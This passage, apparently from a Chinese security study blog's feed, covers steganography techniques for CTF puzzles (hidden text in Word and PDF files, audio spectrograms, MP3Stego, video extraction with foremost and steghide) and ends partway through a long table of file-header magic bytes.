<p><img src="https://img.anineg.space/image-20221010164200074.png" alt="image-20221010164200074"></p>
<h2 id="FOFA">FOFA</h2>
<p><a href="https://fofa.info/">FOFA</a>是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配，例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。</p>
<p><img src="https://img.anineg.space/image-20221010164142922.png" alt="image-20221010164142922"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF隐写术(其他文件隐写)</title>
    <url>/2022/07/10/yinxie2/</url>
    <content><![CDATA[<h1>电子文档隐写：</h1>
<h2 id="Word文件隐写："><strong>Word文件隐写：</strong></h2>
<h3 id="隐藏文本功能隐写："><strong>隐藏文本功能隐写：</strong></h3>
<p>一是进入Word—文件—选项—显示—勾选“隐藏文字”。</p>
<p><img src="https://img.anineg.space/image-20220725103241170.png" alt="image-20220725103241170"></p>
<p>二是使用WinHex查看十六进制数据。</p>
<p><img src="https://img.anineg.space/b427f23d6dc0dc14d28f5167c47a8f3.jpg" alt="b427f23d6dc0dc14d28f5167c47a8f3"></p>
<h3 id="word文档的xml转换：">word文档的xml转换：</h3>
<p>我们可以将word文档转换成xml格式，当然反过来我们也可以将xml转换成word文档，这导致了我们如果重新打包为word文档的过程中，有可能被隐藏进其他数据。</p>
<p>一是将后缀名改为.zip\rar\7z等压缩格式，打开即可查看。</p>
<p><img src="https://img.anineg.space/010a0d81079b704958949fbcca8183a.jpg" alt="010a0d81079b704958949fbcca8183a"></p>
<p>二是使用WinHex查看十六进制数据。</p>
<p><img src="https://img.anineg.space/295371d0b5f16cf0e8c0902afada3cb.jpg" alt="295371d0b5f16cf0e8c0902afada3cb"></p>
<p><strong>PDF文件隐写：</strong></p>
<div class="note success flat"><p>分离方法：</p>
</div>
<p>wbStego分离：</p>
<p>在工具目录中找到 wbStego4open，使用工具载入文档，</p>
<ul>
<li>
<p>Step 1 是文件介绍</p>
</li>
<li>
<p>Step 2 中，我们选择Decode，</p>
</li>
<li>
<p>Step 3 我们选择目标文件</p>
</li>
<li>
<p>Step 4 输入加密密码，这里我是空密码，直接跳过</p>
</li>
<li>
<p>Step 5 为保存文件为 flag.txt</p>
<p><img src="https://img.anineg.space/6f57d63adf5656c09126ce54dfa9c10.jpg" alt="6f57d63adf5656c09126ce54dfa9c10"></p>
</li>
</ul>
<h1>多媒体文件隐写：</h1>
<h2 id="音频隐写："><strong>音频隐写：</strong></h2>
<h3 id="摩斯电码式："><strong>摩斯电码式：</strong></h3>
<p>打开音频文件尝试听一下内容，会听到类似电报的发文声。</p>
<p>摩尔斯电码对照表：</p>
<p><img src="https://img.anineg.space/39ab9391a322baaa53670e1e2e84d49.jpg" alt="39ab9391a322baaa53670e1e2e84d49"></p>
<p>解码方式：</p>
<p>用Adobe Auditon打开目标文件，并观察波形。长的代表代表横线，短的代表点，大的间隔是空格。</p>
<p><img src="https://img.anineg.space/c6d46df848b2964460b4499b4f04d1d.jpg" alt="c6d46df848b2964460b4499b4f04d1d"></p>
<p>翻译后的密文为：</p>
<p><code>-..- .. .- -. --.. .... .. .-.-.- .- .-.. .. -.-- ..- -. .-.-.- -.-. --- --</code></p>
<h3 id="利用MP3stego进行的数据隐写："><strong>利用MP3stego进行的数据隐写：</strong></h3>
<p>MP3Stego命令：</p>
<p>加密：<code>encode -E 加密文本 -P 密码 wav文件 mp3文件</code></p>
<p>解密：<code>decode -X -P 密码 mp3文件</code></p>
<p><img src="https://img.anineg.space/ad731d8f82fd5c10da3423887bbfac6.jpg" alt="ad731d8f82fd5c10da3423887bbfac6"></p>
<h3 id="频谱图的音频隐写："><strong>频谱图的音频隐写：</strong></h3>
<p>频谱是频率谱密度的简称，是频率的分布曲线。复杂振荡分解为振幅不同和频率不同的谐振荡，这些谐振荡的幅值按频率排列的图形叫做频谱。</p>
<p>在CTF中，我们可以单独只对一个声道中，隐写进信息。</p>
<div class="note success flat"><p>分离方法：</p>
</div>
<p>使用Adobe Audition分离：</p>
<p>用AU打开音频文件，调整频谱显示，即可显示出flag。</p>
<p><img src="https://img.anineg.space/339daf06a866ebb8734810e472ba1e1.jpg" alt="339daf06a866ebb8734810e472ba1e1"></p>
<h2 id="视频隐写："><strong>视频隐写：</strong></h2>
<p>目前在CTF赛事中较为常出现的视频隐写，一般都是将一场带有隐写信息的图片，嵌入视频中，我们所需要做的就是将这个图片从视频分离出来，然后在分析我们分离出来的文件是什么，之后的操作可能会涉及到密码编码，图片隐写等知识点。</p>
<p>如果单独对视频来说ffmpeg是一个很好的工具，这里我使用的是foremost，当然我们也可以使用binwalk或者dd等工具，正如我们图片隐写中教大家分离图片所用的方法一样。区别是，ffmpeg将视频分解成一张一张的图片，foremost是一个基于文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具。</p>
<h3 id="使用foremost分离：">使用foremost分离：</h3>
<p>分离命令：</p>
<p><code>foremost xxx.mp4</code></p>
<p>会自动生成output目录存放分离出文件。</p>
<h3 id="使用steghide分离：">使用steghide分离：</h3>
<p>分离命令：</p>
<p><code>steghide extract -sf thing.jpg -p password</code></p>
<h1>常用文件头尾标识：</h1>
<p>JPEG/JPG：</p>
<ul>
<li>文件头标识(2 bytes)：FF D8</li>
<li>文件结束标识(2 bytes)：FF D9</li>
</ul>
<p>PNG：</p>
<ul>
<li>文件头标识(8 bytes)：89 50 4E 47 0D 0A 1A 0A</li>
</ul>
<p>GIF：</p>
<ul>
<li>文件头标识(6 bytes)：47 49 46 38 39(37) 61</li>
<li>文件结束标识(2 bytes)：01 01 00 3B</li>
</ul>
<p>BMP：</p>
<ul>
<li>文件头标识(2 bytes)：42 4D</li>
</ul>
<h2 id="文件头标识及对应类型表："><strong>文件头标识及对应类型表：</strong></h2>
<table>
<thead>
<tr>
<th><strong>扩展名</strong></th>
<th>文件头标识（HEX）</th>
<th><strong>文件描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>123</td>
<td>00 00 1A 00 05 10 04</td>
<td>Lotus 1-2-3 spreadsheet (v9) file</td>
</tr>
<tr>
<td>3gg; 3gp; 3g2</td>
<td>00 00 00 nn 66 74 79 70 33 67 70</td>
<td>3rd Generation Partnership Project 3GPP (nn=0x14)  and 3GPP2 (nn=0x20) multimedia files</td>
</tr>
<tr>
<td>7z</td>
<td>37 7A BC AF 27 1C</td>
<td>7-ZIP compressed file</td>
</tr>
<tr>
<td>aba</td>
<td>00 01 42 41</td>
<td>Palm Address Book Archive file</td>
</tr>
<tr>
<td>abi</td>
<td>41 4F 4C 49 4E 44 45 58</td>
<td>AOL address book index file</td>
</tr>
<tr>
<td>aby; idx</td>
<td>41 4F 4C 44 42</td>
<td>AOL database files: address book (ABY) and user  configuration data (MAIN.IDX)</td>
</tr>
<tr>
<td>accdb</td>
<td>00 01 00 00 53 74 61 6E 64 61 72 64 20 41 43 45 20  44 42</td>
<td>Microsoft Access 2007 file</td>
</tr>
<tr>
<td>ACM</td>
<td>4D 5A</td>
<td>MS audio compression manager driver</td>
</tr>
<tr>
<td>ADF</td>
<td>44 4F 53</td>
<td>Amiga disk file</td>
</tr>
<tr>
<td>adx</td>
<td>03 00 00 00 41 50 50 52</td>
<td>Lotus Approach ADX file</td>
</tr>
<tr>
<td>AIFF</td>
<td>46 4F 52 4D 00</td>
<td>Audio Interchange File</td>
</tr>
<tr>
<td>ain</td>
<td>21 12</td>
<td>AIN Compressed Archive File</td>
</tr>
<tr>
<td>ami</td>
<td>5B 76 65 72 5D</td>
<td>Lotus Ami Pro</td>
</tr>
<tr>
<td>amr</td>
<td>23 21 41 4D 52</td>
<td>Adaptive Multi-Rate ACELP (Algebraic Code Excited  Linear Prediction) Codec, commonly audio format with GSM cell phones</td>
</tr>
<tr>
<td>ANI</td>
<td>52 49 46 46</td>
<td></td>
</tr>
<tr>
<td>API</td>
<td>4D 5A 90 00 03 00 00 00</td>
<td>Acrobat plug-in</td>
</tr>
<tr>
<td>arc</td>
<td>1A 0x</td>
<td>LH archive file, old version(where x = 0x2, 0x3,  0x4, 0x8 or 0x9 for types 1-5, respectively)</td>
</tr>
<tr>
<td>arc</td>
<td>41 72 43 01</td>
<td>FreeArc compressed file</td>
</tr>
<tr>
<td>arj</td>
<td>60 EA</td>
<td>ARJ Compressed Archive</td>
</tr>
<tr>
<td>ARJ</td>
<td>60 EA 27</td>
<td></td>
</tr>
<tr>
<td>ART</td>
<td>4A 47 03 0E 00 00 00</td>
<td>AOL ART file</td>
</tr>
<tr>
<td>ART</td>
<td>4A 47 04 0E 00 00 00</td>
<td>AOL ART file</td>
</tr>
<tr>
<td>asf</td>
<td>30 26 B2 75 8E 66 CF 11</td>
<td>Windows Media</td>
</tr>
<tr>
<td>asf; wma; wmv</td>
<td>30 26 B2 75 8E 66 CF 11 A6 D9 00 AA 00 62 CE 6C</td>
<td>Microsoft Windows Media Audio/Video File(Advanced  Streaming Format)</td>
</tr>
<tr>
<td>asx</td>
<td>3C</td>
<td>Advanced Stream redirector file</td>
</tr>
<tr>
<td>au</td>
<td>2E 73 6E 64</td>
<td>SoundMachine Audio FileNeXT/Sun Microsystems μ-Law audio file</td>
</tr>
<tr>
<td>avi</td>
<td>41 56 49 20</td>
<td>Audio Video Interleave (AVI)</td>
</tr>
<tr>
<td>AX</td>
<td>4D 5A</td>
<td>Library cache file</td>
</tr>
<tr>
<td>AX</td>
<td>4D 5A 90 00 03 00 00 00</td>
<td>DirectShow filter</td>
</tr>
<tr>
<td>bag</td>
<td>41 4F 4C 20 46 65 65 64 62 61 67</td>
<td>AOL and AIM buddy list file</td>
</tr>
<tr>
<td>BAS</td>
<td>20 20 20</td>
<td></td>
</tr>
<tr>
<td>bin</td>
<td>42 4C 49 32 32 33 51</td>
<td>Thomson Speedtouch series WLAN router firmware</td>
</tr>
<tr>
<td>bmp</td>
<td>42 4D</td>
<td>Windows Bitmap</td>
</tr>
<tr>
<td>BMP</td>
<td>42 4D 3E</td>
<td></td>
</tr>
<tr>
<td>bz; bz2</td>
<td>42 5A 68</td>
<td>BZIP Archive</td>
</tr>
<tr>
<td>BZ2; TAR.BZ2; TBZ2; TB2</td>
<td>42 5A 68</td>
<td>bzip2 compressed archive</td>
</tr>
<tr>
<td>CAB</td>
<td>49 53 63</td>
<td></td>
</tr>
<tr>
<td>CAB; HDR</td>
<td>49 53 63 28</td>
<td>Install Shield v5.x or 6.x compressed file</td>
</tr>
<tr>
<td>CAB</td>
<td>4D 53 43 46</td>
<td>Microsoft CAB File Format</td>
</tr>
<tr>
<td>cat</td>
<td>30</td>
<td>Microsoft security catalog file</td>
</tr>
<tr>
<td>CBD</td>
<td>43 42 46 49 4C 45</td>
<td>WordPerfect dictionary file (unconfirmed)</td>
</tr>
<tr>
<td>CCD</td>
<td>5B 43 6C</td>
<td></td>
</tr>
<tr>
<td>cdr</td>
<td>CDR</td>
<td>Corel Draw</td>
</tr>
<tr>
<td>CDR</td>
<td>45 4C 49 54 45 20 43 6F 6D 6D 61 6E 64 65 72 20</td>
<td>Elite Plus Commander saved game file</td>
</tr>
<tr>
<td>CDR, DVF</td>
<td>4D 53 5F 56 4F 49 43 45</td>
<td>Sony Compressed Voice File</td>
</tr>
<tr>
<td>CHI; CHM</td>
<td>49 54 53 46</td>
<td>Microsoft Compiled HTML Help File</td>
</tr>
<tr>
<td>CHM</td>
<td>49 54 53</td>
<td></td>
</tr>
<tr>
<td>CLB</td>
<td>43 4D 58 31</td>
<td>Corel Binary metafile</td>
</tr>
<tr>
<td>CLB</td>
<td>43 4F 4D 2B</td>
<td>COM+ Catalog file</td>
</tr>
<tr>
<td>cnt</td>
<td>3A 42 61 73 65</td>
<td></td>
</tr>
<tr>
<td>COM, DLL, DRV, EXE, PIF, QTS, QTX, SYS</td>
<td>4D 5A</td>
<td>Windows/DOS executable file</td>
</tr>
<tr>
<td>COM</td>
<td>4D 5A EE</td>
<td></td>
</tr>
<tr>
<td>COM</td>
<td>E9 3B 03</td>
<td></td>
</tr>
<tr>
<td>CPE</td>
<td>46 41 58 43 4F 56 45 52 2D 56 45 52</td>
<td>Microsoft Fax Cover Sheet</td>
</tr>
<tr>
<td>CPL</td>
<td>4D 5A</td>
<td>Control panel application</td>
</tr>
<tr>
<td>CPT</td>
<td>43 50 54 37 46 49 4C 45</td>
<td>Corel Photopaint file</td>
</tr>
<tr>
<td>CPT</td>
<td>43 50 54 46 49 4C 45</td>
<td>Corel Photopaint file</td>
</tr>
<tr>
<td>CPX</td>
<td>5B 57 69</td>
<td></td>
</tr>
<tr>
<td>cru; crush</td>
<td>43 52 55 53 48</td>
<td>CRUSH Archive File</td>
</tr>
<tr>
<td>CRU</td>
<td>43 52 55 53 48 20 76</td>
<td>Crush compressed archive</td>
</tr>
<tr>
<td>CRW</td>
<td>49 49 1A 00 00 00 48 45 41 50 43 43 44 52 02 00</td>
<td>Canon digital camera RAW file</td>
</tr>
<tr>
<td>CTF</td>
<td>43 61 74 61 6C 6F 67 20 33 2E 30 30 00</td>
<td>WhereIsIt Catalog file</td>
</tr>
<tr>
<td>CUR</td>
<td>00 00 02 00 01 00 20 20</td>
<td>Windows cursor file</td>
</tr>
<tr>
<td>dat</td>
<td>03</td>
<td>MapInfo Native Data Format</td>
</tr>
<tr>
<td>dat</td>
<td>1A 52 54 53 20 43 4F 4D 50 52 45 53 53 45 44 20 49  4D 41 47 45 20 56 31 2E 30 1A</td>
<td>Runtime Software disk image</td>
</tr>
<tr>
<td>dat</td>
<td>41 56 47 36 5F 49 6E 74 65 67 72 69 74 79 5F 44 61  74 61 62 61 73 65</td>
<td>AVG6 Integrity database file</td>
</tr>
<tr>
<td>DAT</td>
<td>43 52 45 47</td>
<td>Windows 9x registry hive</td>
</tr>
<tr>
<td>DAT</td>
<td>43 6C 69 65 6E 74 20 55 72 6C 43 61 63 68 65 20 4D  4D 46 20 56 65 72 20</td>
<td>IE History DAT file</td>
</tr>
<tr>
<td>DAT</td>
<td>45 52 46 53 53 41 56 45 44 41 54 41 46 49 4C 45</td>
<td>Kroll EasyRecovery Saved Recovery State file</td>
</tr>
<tr>
<td>DAT</td>
<td>49 6E 6E 6F 20 53 65 74 75 70 20 55 6E 69 6E 73 74  61 6C 6C 20 4C 6F 67 20 28 62 29</td>
<td>Inno Setup Uninstall Log file</td>
</tr>
<tr>
<td>db</td>
<td>00 06 15 61 00 00 00 02 00 00 04 D2 00 00 10 00</td>
<td>Netscape Navigator (v4) database file</td>
</tr>
<tr>
<td>DB</td>
<td>44 42 46 48</td>
<td>Palm Zire photo database</td>
</tr>
<tr>
<td>db</td>
<td>08</td>
<td>dBASE IV or dBFast configuration file</td>
</tr>
<tr>
<td>db3</td>
<td>03</td>
<td>dBASE III file</td>
</tr>
<tr>
<td>db4</td>
<td>04</td>
<td>dBASE IV data file</td>
</tr>
<tr>
<td>dba</td>
<td>00 01 42 44</td>
<td>Palm DateBook Archive file</td>
</tr>
<tr>
<td>dbx</td>
<td>CF AD 12 FE</td>
<td></td>
</tr>
<tr>
<td>dbx</td>
<td>CF AD 12 FE C5 FD 74 6F</td>
<td>Outlook Express</td>
</tr>
<tr>
<td>dci</td>
<td>3C 21 64 6F 63 74 79 70</td>
<td>AOL HTML mail file</td>
</tr>
<tr>
<td>dcx</td>
<td>3A DE 68 B1</td>
<td>DCX Graphic File</td>
</tr>
<tr>
<td>DDB</td>
<td>00 01 00</td>
<td></td>
</tr>
<tr>
<td>dib</td>
<td>42 4D</td>
<td>device-independent bitmap image</td>
</tr>
<tr>
<td>DLL</td>
<td>4D 5A 90</td>
<td></td>
</tr>
<tr>
<td>DMP</td>
<td>4D 44 4D 50 93 A7</td>
<td>Windows minidump file</td>
</tr>
<tr>
<td>DMS</td>
<td>44 4D 53 21</td>
<td>Amiga DiskMasher compressed archive</td>
</tr>
<tr>
<td>doc</td>
<td>0D 44 4F 43</td>
<td>DeskMate Document file</td>
</tr>
<tr>
<td>doc</td>
<td>12 34 56 78 90 FF</td>
<td>MS Word 6.0</td>
</tr>
<tr>
<td>doc</td>
<td>31 BE 00 00 00 AB 00 00</td>
<td>MS Word for DOS 6.0</td>
</tr>
<tr>
<td>doc</td>
<td>7F FE 34 0A</td>
<td>MS Word</td>
</tr>
<tr>
<td>dot; ppt; xla; ppa; pps; pot; msi; sdw; db</td>
<td>D0 CF 11 E0</td>
<td>MS Office/OLE2</td>
</tr>
<tr>
<td>doc; dot; xls; xlt; xla; ppt; apr ;ppa; pps; pot; msi;  sdw; db</td>
<td>D0 CF 11 E0 A1 B1 1A E1</td>
<td>MS Compound Document v1 or Lotus Approach APR file</td>
</tr>
<tr>
<td>DPL</td>
<td>4D 5A 50</td>
<td></td>
</tr>
<tr>
<td>DRV</td>
<td>4D 5A 16</td>
<td></td>
</tr>
<tr>
<td>drw</td>
<td>07</td>
<td>A common signature and file extension for many  drawing programs.</td>
</tr>
<tr>
<td>drw</td>
<td>01 FF 02 04 03 02</td>
<td>Micrografx vector graphic file</td>
</tr>
<tr>
<td>ds4</td>
<td>4D 47 58 20 69 74 70 64</td>
<td>Micrografix Designer 4</td>
</tr>
<tr>
<td>DSN</td>
<td>4D 56</td>
<td>CD Stomper Pro label file</td>
</tr>
<tr>
<td>dsp</td>
<td>23 20 4D 69 63 72 6F 73 6F 66 74 20 44 65 76 6 56C  6F 70 65 72 20 53 74 75 64 69 6F</td>
<td>Microsoft Developer Studio project file</td>
</tr>
<tr>
<td>dss</td>
<td>02 64 73 73</td>
<td>Digital Speech Standard (Olympus, Grundig, &amp;  Phillips)</td>
</tr>
<tr>
<td>dtd</td>
<td>07 64 74 32 64 64 74 64</td>
<td>DesignTools 2D Design file</td>
</tr>
<tr>
<td>dtd</td>
<td>3C 21 45 4E 54 49 54 59</td>
<td>XML DTD</td>
</tr>
<tr>
<td>DVR</td>
<td>44 56 44</td>
<td>DVR-Studio stream file</td>
</tr>
<tr>
<td>dwg</td>
<td>41 43 31</td>
<td></td>
</tr>
<tr>
<td>dwg</td>
<td>41 43 31 30</td>
<td>Generic AutoCAD drawingNOTES on AutoCAD file headers: The 0x41-43-31-30  (AC10) is a generic header, occupying the first four bytes in the file. The  next two bytes give further indication about the version or subtype:0x30-32 (02) — AutoCAD R2.50x30-33 (03) — AutoCAD R2.60x30-34 (04) — AutoCAD R90x30-36 (06) — AutoCAD R100x30-39 (09) — AutoCAD R11/R120x31-30 (10) — AutoCAD R13 (subtype 10)0x31-31 (11) — AutoCAD R13 (subtype 11)0x31-32 (12) — AutoCAD R13 (subtype 12)0x31-33 (13) — AutoCAD R14 (subtype 13)0x31-34 (14) — AutoCAD R14 (subtype 14)0x31-35 (15) — AutoCAD R20000x31-38 (18) — AutoCAD R20040x32-31 (21) — AutoCAD R2007</td>
</tr>
<tr>
<td>Enn (where nn are numbers)</td>
<td>45 56 46</td>
<td>EnCase evidence file</td>
</tr>
<tr>
<td>ECO</td>
<td>2A 50 52</td>
<td></td>
</tr>
<tr>
<td>elf</td>
<td>7F 45 4C 46 01 01 01 00</td>
<td>ELF Executable</td>
</tr>
<tr>
<td>emf</td>
<td>01 00 00 00 58 00 00 00</td>
<td>Extended (Enhanced) Windows Metafile Format, printer  spool file</td>
</tr>
<tr>
<td>eml</td>
<td>44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A</td>
<td>Email</td>
</tr>
<tr>
<td>EML</td>
<td>46 72 6F 6D 20 20 20</td>
<td>A commmon file extension for e-mail files.  Signatures shown here are for Netscape, Eudora, and a generic signature,  respectively. EML is also used by Outlook Express and QuickMail.</td>
</tr>
<tr>
<td>EML</td>
<td>46 72 6F 6D 20 3F 3F 3F</td>
<td>A commmon file extension for e-mail files.  Signatures shown here are for Netscape, Eudora, and a generic signature,  respectively. EML is also used by Outlook Express and QuickMail.</td>
</tr>
<tr>
<td>EML</td>
<td>46 72 6F 6D 3A 20</td>
<td>A commmon file extension for e-mail files.  Signatures shown here are for Netscape, Eudora, and a generic signature,  respectively. EML is also used by Outlook Express and QuickMail.</td>
</tr>
<tr>
<td>EML</td>
<td>52 65 63</td>
<td></td>
</tr>
<tr>
<td>enc</td>
<td>00 5C 41 B1 FF</td>
<td>Mujahideen Secrets 2 encrypted file</td>
</tr>
<tr>
<td>enl</td>
<td>[32 byte offset] 40 40 40 20 00 00 40 40 40 40</td>
<td>EndNote Library File</td>
</tr>
<tr>
<td>eps</td>
<td>25 21 50 53</td>
<td>Adobe EPS File</td>
</tr>
<tr>
<td>eps</td>
<td>25 21 50 53 2D 41 64 6F 62 65</td>
<td>Postscript</td>
</tr>
<tr>
<td>eps</td>
<td>25 21 50 53 2D 41 64 6F 62 65 2D 33 2E 30 20 45 50  53 46 2D 33 20 30</td>
<td>Adobe encapsulated PostScript file (If this  signature is not at the immediate beginning of the file, it will occur early in  the file, commonly at byte offset 30)</td>
</tr>
<tr>
<td>EPS</td>
<td>C5 D0 D3</td>
<td></td>
</tr>
<tr>
<td>eth</td>
<td>1A 35 01 00</td>
<td>GN Nettest WinPharoah capture file</td>
</tr>
<tr>
<td>evt</td>
<td>30 00 00 00 4C 66 4C 65</td>
<td>Windows Event Viewer file</td>
</tr>
<tr>
<td>evt</td>
<td>03 00 00 00 C4 66 C4 56</td>
<td></td>
</tr>
<tr>
<td>EVTX</td>
<td>45 6C 66 46 69 6C 65 00</td>
<td>Windows Vista event log file</td>
</tr>
<tr>
<td>exe; dll; drv; vxd; sys; ocx; vbx</td>
<td>4D 5A</td>
<td>Win32 Executable</td>
</tr>
<tr>
<td>exe; dll; drv; vxd; sys; ocx; vbx</td>
<td>4D 5A</td>
<td>Win16 Executable</td>
</tr>
<tr>
<td>exe; com; 386; ax; acm; sys; dll; drv; flt; fon; ocx;  scr; lrc; vxd; cpl; x32</td>
<td>4D 5A</td>
<td>Executable File</td>
</tr>
<tr>
<td>EXE, DLL, OCX, OLB, IMM, IME</td>
<td>4D 5A 90</td>
<td></td>
</tr>
<tr>
<td>fli</td>
<td>00 11 AF</td>
<td>FLIC Animation file</td>
</tr>
<tr>
<td>flt</td>
<td>00 01 01</td>
<td>OpenFlight 3D file</td>
</tr>
<tr>
<td>FLT</td>
<td>4D 5A 90 00 03 00 00 00</td>
<td>Audition graphic filter file (Adobe)</td>
</tr>
<tr>
<td>FLV</td>
<td>46 4C 56 01</td>
<td>Flash video file</td>
</tr>
<tr>
<td>fm</td>
<td>3C 4D 61 6B 65 72 46 69 6C 65 20</td>
<td>Adobe FrameMaker file</td>
</tr>
<tr>
<td>fm3</td>
<td>00 00 1A 00 07 80 01 00</td>
<td>Lotus 123 v3 FMT file</td>
</tr>
<tr>
<td>fmt</td>
<td>20 00 68 00 20 0</td>
<td>Lotus 123 v4 FMT file</td>
</tr>
<tr>
<td>FNT</td>
<td>43 48 41</td>
<td></td>
</tr>
<tr>
<td>FON</td>
<td>4D 5A</td>
<td>Font file</td>
</tr>
<tr>
<td>GBC</td>
<td>87 F5 3E</td>
<td></td>
</tr>
<tr>
<td>gid</td>
<td>3F 5F 03 00</td>
<td>Windows Help Index File</td>
</tr>
<tr>
<td>GID</td>
<td>4C 4E 02 00</td>
<td>Windows Help index file</td>
</tr>
<tr>
<td>GIF</td>
<td>47 49 46 38</td>
<td></td>
</tr>
<tr>
<td>gif</td>
<td>47 49 46 38 37 61</td>
<td>Graphics interchange format file (GIF 87A)</td>
</tr>
<tr>
<td>gif</td>
<td>47 49 46 38 39 61</td>
<td>Graphics interchange format file (GIF89A)</td>
</tr>
<tr>
<td>GTD</td>
<td>7B 50 72</td>
<td></td>
</tr>
<tr>
<td>GX2</td>
<td>47 58 32</td>
<td>Show Partner graphics file (not confirmed)</td>
</tr>
<tr>
<td>gz; tar; tgz</td>
<td>1F 8B</td>
<td>Gzip Archive File</td>
</tr>
<tr>
<td>gz; tgz</td>
<td>1F 8B 08</td>
<td>GZ Compressed File</td>
</tr>
<tr>
<td>hap</td>
<td>91 33 48 46</td>
<td>HAP Archive File</td>
</tr>
<tr>
<td>HDMP</td>
<td>4D 44 4D 50 93 A7</td>
<td>Windows heap dump file</td>
</tr>
<tr>
<td>hdr</td>
<td>23 3F 52 41 44 49 41 4E 43 45 0A</td>
<td>adiance High Dynamic Range image file</td>
</tr>
<tr>
<td>HLP</td>
<td>3F 5F 03</td>
<td></td>
</tr>
<tr>
<td>hlp</td>
<td>3F 5F 03 00</td>
<td>Windows Help file</td>
</tr>
<tr>
<td>HLP</td>
<td>4C 4E 02 00</td>
<td>Windows Help file</td>
</tr>
<tr>
<td>hlp</td>
<td>[7 byte offset] 00 00 FF FF FF FF</td>
<td>Windows Help file</td>
</tr>
<tr>
<td>hqx</td>
<td>28 54 68 69 73 20 66 69 6C 65</td>
<td>Macintosh BinHex 4 Compressed Archive</td>
</tr>
<tr>
<td>hqx</td>
<td>28 54 68 69 73 20 66 69 6C 65 20 6D 75 73 74 20 62  65 20 63 6F 6E 76 65 72 74 65 64 20 77 69 74 68 20 42 69 6E 48 65 78 20</td>
<td>Macintosh BinHex 4 Compressed Archive</td>
</tr>
<tr>
<td>HTM</td>
<td>3C 21 44</td>
<td></td>
</tr>
<tr>
<td>htm; html</td>
<td>3C 21 44 4F 43 54</td>
<td>HyperText Markup Language 3</td>
</tr>
<tr>
<td>htm; html</td>
<td>3C 48 54 4D 4C 3E</td>
<td>HyperText Markup Language 2</td>
</tr>
<tr>
<td>htm; html</td>
<td>3C 68 74 6D 6C 3E</td>
<td>HyperText Markup Language 1</td>
</tr>
<tr>
<td>html</td>
<td>68 74 6D 6C 3E</td>
<td>HTML</td>
</tr>
<tr>
<td>ico</td>
<td>00 00 01 00 00</td>
<td>Icon File</td>
</tr>
<tr>
<td>ico</td>
<td>00 00 01 00 01 00 20 20</td>
<td>Icon File</td>
</tr>
<tr>
<td>IFF</td>
<td>46 4F 52 4D</td>
<td></td>
</tr>
<tr>
<td>IFO</td>
<td>44 56 44</td>
<td>DVD info file</td>
</tr>
<tr>
<td>IME</td>
<td>4D 5A 90</td>
<td></td>
</tr>
<tr>
<td>img</td>
<td>00 01 00 08 00 01 00 01 01</td>
<td>Ventura Publisher/GEM VDI Image Format Bitmap file</td>
</tr>
<tr>
<td>IMG</td>
<td>00 FF FF</td>
<td></td>
</tr>
<tr>
<td>IMM</td>
<td>4D 5A 90</td>
<td></td>
</tr>
<tr>
<td>ind</td>
<td>41 4F 4C 49 44 58</td>
<td>AOL client preferences/settings file (MAIN.IND)</td>
</tr>
<tr>
<td>ISO</td>
<td>43 44 30 30 31</td>
<td>ISO-9660 CD Disc Image (This signature usually  occurs at byte 8001, 8801, or 9001.)</td>
</tr>
<tr>
<td>ivr</td>
<td>2E 52 45 43</td>
<td>RealPlayer video file (V11 and later)</td>
</tr>
<tr>
<td>JAR</td>
<td>4A 41 52 43 53 00</td>
<td>JARCS compressed archive</td>
</tr>
<tr>
<td>jar</td>
<td>5F 27 A8 89</td>
<td>JAR Archive File</td>
</tr>
<tr>
<td>jpg; jpeg</td>
<td>FF D8 FF</td>
<td></td>
</tr>
<tr>
<td>jpg; jpe; jpeg</td>
<td>FF D8 FF E0 00</td>
<td>JPG Graphic File</td>
</tr>
<tr>
<td>jpg; jpe; jpeg</td>
<td>FF D8 FF FE 00</td>
<td>JPG Graphic File</td>
</tr>
<tr>
<td>KGB</td>
<td>4B 47 42 5F 61 72 63 68 20 2D</td>
<td>KGB archive</td>
</tr>
<tr>
<td>KOZ</td>
<td>49 44 33 03 00 00 00</td>
<td>Sprint Music Store audio file (for mobile devices)</td>
</tr>
<tr>
<td>LDB</td>
<td>42 49 4C</td>
<td></td>
</tr>
<tr>
<td>lha</td>
<td>2D 6C 68 35 2D</td>
<td>LHA Compressed</td>
</tr>
<tr>
<td>lha; lzh</td>
<td>[2 byte offset] 2D 6C 68</td>
<td>Compressed archive file</td>
</tr>
<tr>
<td>LHP</td>
<td>3F 5F 03</td>
<td></td>
</tr>
<tr>
<td>lhp</td>
<td>3F 5F 03 00</td>
<td>Windows Help File</td>
</tr>
<tr>
<td>lib</td>
<td>21 3C 61 72 63 68 3E 0A</td>
<td>Unix archiver (ar) files and Microsoft Program  Library Common Object File Format (COFF)</td>
</tr>
<tr>
<td>LIB</td>
<td>2A 24 20</td>
<td></td>
</tr>
<tr>
<td>LIT</td>
<td>49 54 4F 4C 49 54 4C 53</td>
<td>Microsoft Reader eBook file</td>
</tr>
<tr>
<td>LNK</td>
<td>4C 00 00</td>
<td></td>
</tr>
<tr>
<td>lnk</td>
<td>4C 00 00 00</td>
<td>Windows Shortcut (Link File)</td>
</tr>
<tr>
<td>lnk</td>
<td>4C 00 00 00 01 14 02</td>
<td>Windows Link File</td>
</tr>
<tr>
<td>LNK</td>
<td>4C 00 00 00 01 14 02 00</td>
<td>Windows shortcut file</td>
</tr>
<tr>
<td>log</td>
<td>2A 2A 2A 20 20 49 6E 73 74 61 6C 6C 61 74 69 6F 6E  20 53 74 61 72 74 65 64 20</td>
<td>Symantec Wise Installer log file</td>
</tr>
<tr>
<td>lzh</td>
<td>lh</td>
<td>Lz compression file</td>
</tr>
<tr>
<td>lwp</td>
<td>57 6F 72 64 50 72 6F</td>
<td>Lotus WordPro v9</td>
</tr>
<tr>
<td>m3u</td>
<td>23 45 58</td>
<td></td>
</tr>
<tr>
<td>m4a</td>
<td>00 00 00 20 66 74 79 70 4D 34 41 20 00 00 00 00</td>
<td>Apple Lossless Audio Codec file</td>
</tr>
<tr>
<td>m4a; m4v</td>
<td>00 00 00 20 66 74 79 70 4D 34 41 20 00 00 00 00</td>
<td>QuickTime M4A/M4V file</td>
</tr>
<tr>
<td>manifest</td>
